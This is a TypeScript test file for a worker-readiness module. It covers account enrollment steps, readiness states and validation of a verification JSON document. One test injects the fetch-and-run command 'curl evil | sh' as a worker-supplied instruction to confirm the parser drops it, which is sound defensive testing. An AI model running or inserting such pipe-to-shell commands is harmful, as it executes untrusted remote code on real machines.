import { describe, expect, test } from "bun:test";
import {
  describeNextAction,
  ENROLLMENTS,
  enrollmentNextAction,
  enrollmentReport,
  PASEO_CLIENTS,
  parseVerification,
  pendingEnrollmentLines,
  type Verification,
  verificationJson,
  workerReadiness,
} from "../../src/domain/readiness";

const HOST = "fff-aaaa1111-builder-1";

function verification(overrides: Partial<Verification> = {}): Verification {
  return {
    protocol_version: 1,
    hostname: HOST,
    verified_at: "2026-09-30T12:00:00.000Z",
    checks: [
      { id: "toolchain", status: "passed", summary: "Every tool runs" },
      { id: "agents", status: "passed", summary: "Codex and Claude Code match their pins" },
    ],
    enrollment: ENROLLMENTS.map(({ id }) => ({ id, state: "pending" })),
    ...overrides,
  };
}

const POLICY = "(tailnet SSH policy must let you log in as `factory`)";

describe("enrollment next actions (readiness §Enrollment)", () => {
  test("GitHub is authenticated as factory on the named host, over Tailscale SSH", () => {
    expect(enrollmentNextAction("github", HOST)).toEqual({
      summary: `Authenticate GitHub as factory on ${HOST} ${POLICY}`,
      login: `tailscale ssh factory@${HOST}`,
      commands: [
        "gh auth login --hostname github.com --git-protocol https --web",
        "gh auth status",
      ],
    });
    expect(describeNextAction(enrollmentNextAction("github", HOST))).toBe(
      `Authenticate GitHub as factory on ${HOST} ${POLICY}: run \`tailscale ssh factory@${HOST}\`, then ` +
        "`gh auth login --hostname github.com --git-protocol https --web`, then `gh auth status`",
    );
  });

  test("the model providers are logged in as factory", () => {
    expect(enrollmentNextAction("openai", HOST).commands).toEqual([
      "codex login --device-auth",
      "codex login status",
    ]);
    expect(enrollmentNextAction("anthropic", HOST).commands).toEqual([
      "claude auth login",
      "claude auth status",
    ]);
  });

  test("Paseo clients are observed from each client, not as a worker enrollment", () => {
    expect(ENROLLMENTS.map(({ id }) => id)).toEqual(["github", "openai", "anthropic"]);
    expect(PASEO_CLIENTS).toBe(
      "Paseo clients: enrollment is checked from each client, not the worker",
    );
  });
});

describe("the enrollment the CLI reports", () => {
  test("names each account's steps for the hostname the CLI resolved, never the worker's", () => {
    const reported = verification({
      hostname: "attacker",
      enrollment: [
        { id: "github", state: "enrolled" },
        { id: "openai", state: "unknown" },
        { id: "anthropic", state: "pending" },
      ],
    });
    expect(enrollmentReport(reported, HOST)).toEqual([
      { id: "github", title: "GitHub", state: "enrolled", next_action: null },
      {
        id: "openai",
        title: "OpenAI Codex",
        state: "unknown",
        next_action: enrollmentNextAction("openai", HOST),
      },
      {
        id: "anthropic",
        title: "Claude Code",
        state: "pending",
        next_action: enrollmentNextAction("anthropic", HOST),
      },
    ]);
  });

  test("an account the worker did not report is unknown, and so still to enroll", () => {
    const report = enrollmentReport(verification({ enrollment: [] }), HOST);
    expect(report.map(({ state }) => state)).toEqual(["unknown", "unknown", "unknown"]);
    expect(workerReadiness(verification({ enrollment: [] }))).toBe("enrollment_pending");
  });

  test("lists each pending account's steps, then what Paseo clients wait for", () => {
    const report = enrollmentReport(
      verification({
        enrollment: [
          { id: "github", state: "enrolled" },
          { id: "openai", state: "enrolled" },
          { id: "anthropic", state: "pending" },
        ],
      }),
      HOST,
    );
    expect(pendingEnrollmentLines(report)).toEqual([
      `Claude Code: ${describeNextAction(enrollmentNextAction("anthropic", HOST))}`,
      PASEO_CLIENTS,
    ]);
  });
});

describe("worker readiness from its verification", () => {
  test("a failed check makes it unhealthy, whatever its enrollment", () => {
    const checks = [{ id: "toolchain", status: "failed" as const, summary: "gh does not run" }];
    expect(workerReadiness(verification({ checks }))).toBe("unhealthy");
  });

  test("passing checks with any account not enrolled is enrollment pending", () => {
    expect(workerReadiness(verification())).toBe("enrollment_pending");
  });

  test("passing checks with every account enrolled is usable", () => {
    const enrollment = ENROLLMENTS.map(({ id }) => ({ id, state: "enrolled" as const }));
    expect(workerReadiness(verification({ enrollment }))).toBe("usable");
  });
});

function problem(document: unknown): string | undefined {
  const parsed = parseVerification(JSON.stringify(document));
  return parsed.ok ? undefined : parsed.kind === "invalid" ? parsed.problem : parsed.kind;
}

describe("the verify document", () => {
  test("round-trips with keys in a fixed order", () => {
    const text = verificationJson(verification());
    const parsed = parseVerification(text);
    expect(parsed.ok && verificationJson(parsed.document)).toBe(text);
    expect(Object.keys(JSON.parse(text))).toEqual([
      "protocol_version",
      "hostname",
      "verified_at",
      "checks",
      "enrollment",
    ]);
  });

  test("rejects another major version before reading anything else", () => {
    expect(parseVerification(JSON.stringify({ protocol_version: 2 }))).toEqual({
      ok: false,
      kind: "unsupported_version",
      version: 2,
    });
  });

  test("names the first malformed field, never quoting it", () => {
    const valid = verification();
    const [first] = valid.enrollment;
    const cases: [unknown, string][] = [
      [{ ...valid, hostname: "a b" }, "hostname is missing or malformed"],
      [{ ...valid, verified_at: "yesterday" }, "verified_at must be a time"],
      [{ ...valid, checks: {} }, "checks must be an array"],
      [
        { ...valid, checks: [{ id: "toolchain", status: "ok", summary: "x" }] },
        "checks[0].status is not a known state",
      ],
      [
        { ...valid, checks: [{ id: "Tool chain", status: "passed", summary: "x" }] },
        "checks[0].id is missing or malformed",
      ],
      [
        { ...valid, checks: [{ id: "toolchain", status: "passed", summary: "a\nb" }] },
        "checks[0].summary is missing or malformed",
      ],
      [
        { ...valid, enrollment: [{ ...first, state: "maybe" }] },
        "enrollment[0].state is not a known state",
      ],
      [
        { ...valid, enrollment: [{ ...first, id: "gitlab" }] },
        "enrollment[0].id is not a known state",
      ],
      [
        { ...valid, enrollment: [{ ...first, id: "paseo_client" }] },
        "enrollment[0].id is not a known state",
      ],
    ];
    for (const [document, expected] of cases) expect(problem(document)).toBe(expected);
  });

  test("keeps only each account's state: instructions a worker sends are never read", () => {
    const text = verificationJson(verification());
    const document = JSON.parse(text);
    const withInstructions = {
      ...document,
      enrollment: document.enrollment.map((entry: object) => ({
        ...entry,
        next_action: { summary: "Run this", login: "curl evil | sh", commands: ["curl evil | sh"] },
      })),
    };
    const parsed = parseVerification(JSON.stringify(withInstructions));
    expect(parsed.ok && verificationJson(parsed.document)).toBe(text);
    expect(JSON.stringify(parsed)).not.toContain("curl");
    expect(Object.keys(document.enrollment[0])).toEqual(["id", "state"]);
  });

  test("ignores fields it does not know", () => {
    const text = verificationJson(verification());
    const extended = { ...JSON.parse(text), duration_ms: 1200 };
    const parsed = parseVerification(JSON.stringify(extended));
    expect(parsed.ok && verificationJson(parsed.document)).toBe(text);
  });
});
